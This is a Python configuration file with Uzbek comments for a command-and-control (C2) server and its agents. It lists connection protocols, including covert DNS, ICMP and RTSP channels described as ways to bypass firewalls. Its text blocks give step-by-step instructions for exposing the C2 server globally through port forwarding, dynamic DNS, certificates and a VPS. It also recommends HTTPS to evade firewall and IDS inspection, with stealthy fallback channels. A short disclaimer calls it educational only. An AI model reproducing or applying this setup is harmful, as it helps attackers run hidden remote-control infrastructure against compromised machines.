"""
Global Ulanish Konfiguratsiyasi
Internet orqali C2 serverga ulanish sozlamalari
"""

# ============================================================
# 🌐 GLOBAL ULANISH SOZLAMALARI
# ============================================================

# Lokal vs Global ulanish
DEPLOYMENT_MODE = "local"  # "local" yoki "global"

# Lokal tarmoq (LAN - Local Area Network)
LOCAL_SETTINGS = {
    "host": "127.0.0.1",  # localhost (faqat shu kompyuterda)
    "lan_host": "192.168.1.100",  # LAN IP (local tarmoqda)
}

# Global tarmoq (WAN - Wide Area Network / Internet)
GLOBAL_SETTINGS = {
    "public_ip": "YOUR_PUBLIC_IP",  # Public IP manzil (ISP dan)
    "domain": "c2.example.com",  # Domain (agar bor bo'lsa)
    "ddns": "myc2.ddns.net",  # Dynamic DNS (agar public IP o'zgarsa)
}

# ============================================================
# 📊 PROTOKOLLAR VA PORTLAR
# ============================================================

PROTOCOLS = {
    # Oddiy protokollar
    "TCP": {
        "port": 9999,
        "description": "Raw TCP socket - Eng tez",
        "firewall_friendly": False,
        "encryption": "Custom",
        "global_ready": True
    },
    
    "HTTP": {
        "port": 8080,
        "description": "HTTP - Firewall o'tadi",
        "firewall_friendly": True,
        "encryption": None,
        "global_ready": True
    },
    
    # Shifrlangan protokollar
    "HTTPS": {
        "port": 8443,
        "description": "HTTPS - SSL/TLS shifrlangan",
        "firewall_friendly": True,
        "encryption": "SSL/TLS",
        "global_ready": True,
        "requires": "SSL sertifikat"
    },
    
    "WebSocket": {
        "port": 8765,
        "description": "WebSocket - Real-time aloqa",
        "firewall_friendly": True,
        "encryption": "TLS opsional",
        "global_ready": True
    },
    
    # Yashirin protokollar (Covert Channels)
    "DNS": {
        "port": 53,
        "description": "DNS Tunneling - Firewall bypass",
        "firewall_friendly": True,
        "encryption": "Custom encoding",
        "global_ready": True,
        "requires": "Administrator (port 53)"
    },
    
    "ICMP": {
        "port": None,
        "description": "ICMP Ping - Firewall bypass",
        "firewall_friendly": True,
        "encryption": "Payload encoding",
        "global_ready": True,
        "requires": "Administrator (raw socket)"
    },
    
    "RTSP": {
        "port": 554,
        "description": "RTSP Streaming - Video cover",
        "firewall_friendly": True,
        "encryption": "Steganography",
        "global_ready": True,
        "requires": "Administrator (port 554) yoki 8554"
    },
    
    # Connectionless
    "UDP": {
        "port": 5353,
        "description": "UDP - Tez, connectionless",
        "firewall_friendly": False,
        "encryption": "Custom",
        "global_ready": True
    },
}

# ============================================================
# 🔒 HTTPS ISHLATISH SABABLARI
# ============================================================

HTTPS_BENEFITS = """
✅ HTTPS ISHLATISH KERAK CHUNKI:

1. 🔐 Shifrlangan Aloqa
   - HTTP: Ma'lumotlar ochiq yuboriladi
   - HTTPS: SSL/TLS shifrlangan, hech kim o'qiy olmaydi

2. 🛡️ Man-in-the-Middle Hujumlardan Himoya
   - HTTP: Oraliq odam ma'lumotlarni ko'radi/o'zgartiradi
   - HTTPS: Sertifikat tekshiruvi, o'zgartirishni aniqlaydi

3. 🌐 Global Internet Uchun Xavfsizlik
   - Internetda HTTP xavfli
   - HTTPS standart, ishonchli

4. 🚫 Firewall va IDS Bypass
   - HTTPS shifrlangan, content tekshirilmaydi
   - Oddiy HTTPS traffic kabi ko'rinadi

5. ✅ Zamonaviy Standart
   - Barcha saytlar HTTPS ishlatadi
   - HTTP suspicious ko'rinadi

❌ HTTP FAQAT LOKAL TESTDA ISHLATILADI!
"""

# ============================================================
# 🌍 GLOBAL ULANISH QILISH BO'YICHA QO'LLANMA
# ============================================================

GLOBAL_SETUP_GUIDE = """
╔══════════════════════════════════════════════════════════╗
║         GLOBAL INTERNET ULANISH SOZLASH                  ║
╠══════════════════════════════════════════════════════════╣

1️⃣  PUBLIC IP MANZILNI ANIQLASH
   ────────────────────────────────────────
   • Windows: curl ifconfig.me
   • Browser: https://whatismyip.com
   • ISP dan static IP sotib olish (opsional)

2️⃣  PORT FORWARDING (Router Sozlash)
   ────────────────────────────────────────
   • Router admin panelga kiring (192.168.1.1)
   • Port Forwarding / Virtual Server qism
   • Qo'shish:
     - External Port: 8443 (HTTPS)
     - Internal IP: 192.168.1.100 (sizning PC)
     - Internal Port: 8443
     - Protocol: TCP
   
3️⃣  FIREWALL SOZLASH
   ────────────────────────────────────────
   Windows Firewall:
   • Control Panel → Firewall
   • Inbound Rules → New Rule
   • Port: 8443, TCP
   • Allow connection
   
4️⃣  DYNAMIC DNS (agar public IP o'zgarsa)
   ────────────────────────────────────────
   • No-IP.com yoki DuckDNS.org
   • Subdomain yaratish: myc2.ddns.net
   • Router'da DDNS sozlash
   
5️⃣  SSL SERTIFIKAT (HTTPS uchun)
   ────────────────────────────────────────
   • Self-signed: server avtomatik yaratadi
   • Let's Encrypt: bepul real sertifikat
   • certbot --standalone -d myc2.ddns.net

6️⃣  SERVER ISHGA TUSHIRISH
   ────────────────────────────────────────
   python server/https_server.py
   
7️⃣  AGENT SOZLASH
   ────────────────────────────────────────
   SERVER_HOST = "myc2.ddns.net"  # yoki public IP
   SERVER_PORT = 8443
   PROTOCOL = "HTTPS"

╠══════════════════════════════════════════════════════════╣
║  ⚠️  OGOHLANTIRISH:                                      ║
║  • Global C2 noqonuniy bo'lishi mumkin                   ║
║  • Faqat ta'lim va o'z tarmog'ingizda!                   ║
║  • ISP port 80/443 bloklashi mumkin                      ║
║  • VPS (Virtual Private Server) ishlatish yaxshiroq      ║
╚══════════════════════════════════════════════════════════╝
"""

# ============================================================
# 🚀 PROTOKOL TANLASH BO'YICHA TAVSIYALAR
# ============================================================

PROTOCOL_RECOMMENDATIONS = """
🎯 QAYSI PROTOKOLNI ISHLATISH KERAK?

┌─────────────────────────────────────────────────────────┐
│ VAZIYAT                  │ TAVSIYA PROTOKOL             │
├─────────────────────────────────────────────────────────┤
│ Lokal test              │ TCP (9999) - Eng oddiy       │
│ LAN ichida              │ HTTP (8080) - Oson           │
│ Internet orqali         │ HTTPS (8443) - Xavfsiz       │
│ Firewall bypass         │ DNS (53) - Har doim o'tadi   │
│ Juda yashirin           │ ICMP - Ping kabi ko'rinadi   │
│ Real-time chat          │ WebSocket - Tez aloqa        │
│ Video streaming qoplami │ RTSP - Videoga o'xshab       │
│ Tez data transfer       │ UDP - Overhead kam           │
└─────────────────────────────────────────────────────────┘

💡 ENG YAXSHI KOMBINATSIYA:
   • Primary: HTTPS (8443) - asosiy kanal
   • Fallback: DNS (53) - agar HTTPS blok bo'lsa
   • Stealth: ICMP - juda yashirin backup
"""

# ============================================================
# 📝 VPS (Virtual Private Server) SOZLASH
# ============================================================

VPS_SETUP = """
🌐 VPS ORQALI GLOBAL C2 (ENG YAXSHI USUL)

1. VPS Sotib Olish
   ──────────────────
   • DigitalOcean, Vultr, Linode
   • $5/month - basic droplet
   • Ubuntu 22.04 LTS

2. Server Setup
   ──────────────────
   ssh root@YOUR_VPS_IP
   apt update && apt upgrade -y
   apt install python3 python3-pip git -y
   
3. C2 Platformni Yuklash
   ──────────────────
   git clone https://github.com/your/c2.git
   cd c2
   pip3 install -r requirements.txt
   
4. HTTPS Sertifikat
   ──────────────────
   apt install certbot -y
   certbot certonly --standalone -d yourdomain.com
   
5. Server Ishga Tushirish
   ──────────────────
   nohup python3 server/https_server.py &
   
6. Agentdan Ulanish
   ──────────────────
   SERVER_HOST = "yourdomain.com"
   SERVER_PORT = 8443

✅ AFZALLIKLAR:
   • 24/7 online
   • Static IP
   • Tez internet
   • Port bloklash yo'q
   • Professional
"""

if __name__ == "__main__":
    print(HTTPS_BENEFITS)
    print(GLOBAL_SETUP_GUIDE)
    print(PROTOCOL_RECOMMENDATIONS)
    print(VPS_SETUP)
